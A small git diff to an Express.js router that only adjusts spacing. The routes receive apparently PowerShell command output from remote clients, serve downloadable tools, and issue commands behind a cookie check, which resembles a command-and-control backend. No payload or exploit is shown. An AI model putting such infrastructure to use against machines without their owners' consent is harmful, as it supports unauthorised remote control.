@@ -19,16 +19,16 @@ router.route('/ps/response').post((req, res) => {
     const response_id = GenerateRandomId(6);
     const clientId = req.headers['clientid'];
     let response = req.body.response;
-    response = response.replace(/^(?=\n)$|^\s*|\s*$|\n\n+/gm,'')
+    response = response.replace(/^(?=\n)$|^\s*|\s*$|\n\n+/gm, '')
     const newPsResponse = new psResponse({response_id: response_id, client_id: clientId, response: response});
     newPsResponse.save()
         .then(() => res.send())
         .catch(err => console.log(err.message));
 });
-router.use('/auth',FirstAuthentication)
+router.use('/auth', FirstAuthentication)
 router.use('/download', StaticToolRoutes);
 
 router.use(toolCookieValidator);
-router.use('/commands',CommandRouter)
+router.use('/commands', CommandRouter)
 router.use('/response', ToolResponsesRouter);
 module.exports = router;
